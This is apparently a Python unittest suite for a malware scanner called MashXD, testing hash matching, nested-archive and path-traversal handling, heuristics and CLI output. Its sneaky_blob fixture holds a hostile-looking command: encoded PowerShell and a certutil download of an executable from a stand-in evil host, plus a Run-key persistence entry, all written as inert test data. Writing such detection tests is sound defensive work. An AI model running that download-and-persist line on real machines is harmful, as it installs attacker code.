#!/usr/bin/env python3
"""Test suite for MashXD (stdlib unittest - no extra deps needed).

Run from the repo root:
    python -m unittest discover -s tests -v
"""
import binascii
import hashlib
import json
import random
import shutil
import subprocess
import sys
import tempfile
import unittest
import zipfile
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT))

import MashXD  # noqa: E402

EVIL = b"MASHXD-POC-EVIL-SAMPLE-v1"
PAYLOAD = b"MASHXD-POC-NESTED-PAYLOAD-dll-v2"
SAMPLE_DIR = ROOT / "samples"
TASK2 = SAMPLE_DIR / "Task2.zip"
HASH_LIST = SAMPLE_DIR / "Mal-Hashes.txt"


def build_fixture(tmp):
    """Synthetic zip: a clean file, an evil file, and a nested archive."""
    nested = tmp / "nested.zip"
    with zipfile.ZipFile(nested, "w") as z:
        z.writestr("payload.dll", PAYLOAD)

    fixture = tmp / "fixture.zip"
    with zipfile.ZipFile(fixture, "w") as z:
        z.writestr("clean.txt", "just a normal text file")
        z.writestr("evil.exe", EVIL)
        z.writestr("../evil-traversal.exe", EVIL)
        z.write(nested, "nested.zip")

    crc = "%08x" % (binascii.crc32(EVIL) & 0xFFFFFFFF)
    hashes = tmp / "hashes.txt"
    hashes.write_text(
        "# demo list\n"
        f"   {crc}\t\n"
        f"{crc.upper()}\n"
        f"{hashlib.sha256(PAYLOAD).hexdigest()}\n"
        f"{hashlib.md5(PAYLOAD).hexdigest()}\n"
    )
    return fixture, hashes


def sneaky_blob():
    rng = random.Random(42)
    raw = bytes(rng.randrange(256) for _ in range(4096))
    blob = bytearray()
    blob += b"MZ\x90\x00" + raw[:64] + b"PE\x00\x00" + raw[64:128]
    blob += (b"powershell -enc aGVsbG8gd29ybGQhISEhISEhISEhISEhISE= "
             b"| cmd.exe /c certutil -urlcache -f "
             b"http://cdn.evil.invalid/x.exe %TEMP%\\x.exe\r\n")
    blob += b"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\persist\r\n"
    return bytes(blob)


class HashListTests(unittest.TestCase):
    def test_normalization(self):
        tmp = Path(tempfile.mkdtemp())
        try:
            hashes = tmp / "h.txt"
            hashes.write_text("# comment\n   ABC123\nabc123\n\n DEADBEEF \n")
            self.assertEqual(MashXD.load_hash_list(hashes),
                             {"abc123", "deadbeef"})
        finally:
            shutil.rmtree(tmp, ignore_errors=True)

    def test_empty_list_rejected(self):
        tmp = Path(tempfile.mkdtemp())
        try:
            hashes = tmp / "empty.txt"
            hashes.write_text("# only a comment\n")
            with self.assertRaises(SystemExit):
                MashXD.load_hash_list(hashes)
        finally:
            shutil.rmtree(tmp, ignore_errors=True)


class ScanUnitTests(unittest.TestCase):
    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp())
        self.fixture, self.hashes = build_fixture(self.tmp)
        self.signatures = MashXD.load_hash_list(self.hashes)

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def test_counted_digests(self):
        ds = MashXD.digests(EVIL)
        self.assertEqual(len(ds), len(MashXD.HASH_ALGORITHMS) + 1)  # + crc32
        self.assertEqual(ds["sha256"], hashlib.sha256(EVIL).hexdigest())
        self.assertEqual(
            ds["crc32"], "%08x" % (binascii.crc32(EVIL) & 0xFFFFFFFF))

    def test_sniff_type(self):
        self.assertIn("ZIP", MashXD.sniff_type(b"PK\x03\x04x"))
        self.assertIn("PE", MashXD.sniff_type(b"MZ\x90\x00"))
        self.assertIn("PDF", MashXD.sniff_type(b"%PDF-1.7"))
        self.assertIn("script", MashXD.sniff_type(b"#!/bin/bash\necho hi"))
        self.assertIn("data file (.py)", MashXD.sniff_type(b"print()", "x.py"))
        self.assertIn("unknown", MashXD.sniff_type(b"\x00\x01\x02"))

    def test_provenance_and_signatures(self):
        findings = MashXD.scan_path(self.fixture, self.signatures, 6, False)
        by_name = {f["in"]: f for f in findings}

        evil = by_name["evil.exe"]
        self.assertEqual(evil["grade"], "MALWARE")
        self.assertEqual(evil["score"], 100)
        self.assertIn("crc32", {h[0] for h in evil["hashes"]})

        nested = by_name["nested.zip/payload.dll"]
        self.assertEqual(nested["grade"], "MALWARE")
        self.assertIn("sha256", {h[0] for h in nested["hashes"]})
        self.assertIn("md5", {h[0] for h in nested["hashes"]})

        self.assertEqual(by_name["clean.txt"]["grade"], "CLEAN")
        for prov in by_name:
            self.assertNotIn("..", prov.replace("\\", "/").split("/"))
        self.assertIn("evil-traversal.exe", by_name)  # sanitized, still scanned
        self.assertEqual(by_name["evil-traversal.exe"]["grade"], "MALWARE")
        self.assertIn("nested.zip", by_name)  # container is itself a file
        self.assertEqual(by_name["nested.zip"]["grade"], "CLEAN")

    def test_heuristics_without_hash_hit(self):
        blob = sneaky_blob()
        tmp = self.tmp / "sneaky.bin"
        tmp.write_bytes(blob)
        findings = MashXD.scan_path(tmp, self.signatures, 6, False)
        self.assertEqual(len(findings), 1)
        f = findings[0]
        self.assertNotEqual(f["grade"], "CLEAN")
        self.assertGreater(f["score"], 0)
        groups = f["indicators"]
        self.assertIn("cmd", groups)
        self.assertIn("persist", groups)
        self.assertIn("url", groups)
        self.assertEqual(f["type"], "PE executable (MZ)")

    def test_plain_file_score_zero(self):
        tmp = self.tmp / "notes.txt"
        tmp.write_text("just plain notes\n")
        findings = MashXD.scan_path(tmp, self.signatures, 6, False)
        self.assertEqual(findings[0]["grade"], "CLEAN")
        self.assertEqual(findings[0]["score"], 0)

    def test_directory_mode(self):
        sub = self.tmp / "drop"
        sub.mkdir()
        (sub / "victim.txt").write_bytes(PAYLOAD)
        (sub / "nested.zip").write_bytes(self.fixture.read_bytes())
        findings = MashXD.scan_path(self.tmp, self.signatures, 6, False)
        scans = {f["in"] for f in findings}
        self.assertIn("drop/victim.txt", scans)
        self.assertIn("drop/nested.zip/evil.exe", scans)
        self.assertTrue(any(f["grade"] == "MALWARE" for f in findings))

    def test_depth_gate(self):
        findings = MashXD.scan_path(self.fixture, self.signatures, 0, False)
        names = {f["in"] for f in findings}
        self.assertIn("evil.exe", names)  # top-level members still scanned
        self.assertNotIn("nested.zip/payload.dll", names)  # nested blocked


class CliTests(unittest.TestCase):
    def run_cli(self, *args):
        return subprocess.run(
            [sys.executable, str(ROOT / "MashXD.py"), *args],
            capture_output=True, text=True, cwd=ROOT, timeout=120)

    def test_json_purity(self):
        with tempfile.TemporaryDirectory() as tmp:
            fixture, hashes = build_fixture(Path(tmp))
            proc = self.run_cli("-l", str(hashes), "-f", str(fixture), "--json")
            self.assertEqual(proc.returncode, 0, msg=proc.stderr)
            data = json.loads(proc.stdout)  # must be pure JSON
            mal = [f for f in data["findings"] if f["grade"] == "MALWARE"]
            self.assertEqual(len(mal), 3)  # evil + traversal + nested payload

    def test_html_report(self):
        with tempfile.TemporaryDirectory() as tmp:
            fixture, hashes = build_fixture(Path(tmp))
            out = Path(tmp) / "report.html"
            proc = self.run_cli("-l", str(hashes), "-f", str(fixture),
                                "--html", str(out))
            self.assertEqual(proc.returncode, 0, msg=proc.stderr)
            self.assertTrue(out.exists())
            self.assertIn("MashXD", out.read_text(encoding="utf-8"))

    def test_missing_file_error(self):
        proc = self.run_cli("-l", "nope.txt", "-f", "/does/not/exist.zip")
        self.assertNotEqual(proc.returncode, 0)
        self.assertIn("not found", proc.stderr + proc.stdout)


@unittest.skipUnless(TASK2.exists() and HASH_LIST.exists(),
                     "samples/ dataset not present in this checkout")
class RealDatasetTests(unittest.TestCase):
    EXPECTED_MALWARE = {
        "Task2/0923131.zip/0923131.dll",    # sha256
        "Task2/4132356.zip/4132356.exe",    # md5
        "Task2/5869342.exe",                # crc32
        "Task2/8572213.ini",                # sha512
        "Task2/bAdFiLe.zip/KeyLover.py",   # sha256
    }

    def test_all_known_detections_surfaced(self):
        signatures = MashXD.load_hash_list(HASH_LIST)
        findings = MashXD.scan_path(TASK2, signatures, 6, False)
        mal = {f["in"] for f in findings if f["grade"] == "MALWARE"}
        missing = self.EXPECTED_MALWARE - mal
        self.assertEqual(missing, set())

    def test_keylover_hash_hit(self):
        signatures = MashXD.load_hash_list(HASH_LIST)
        findings = MashXD.scan_path(TASK2, signatures, 6, False)
        kl = next(f for f in findings if f["in"].endswith("KeyLover.py"))
        self.assertEqual(kl["grade"], "MALWARE")
        self.assertEqual(kl["size"], 816)


if __name__ == "__main__":
    unittest.main(verbosity=2)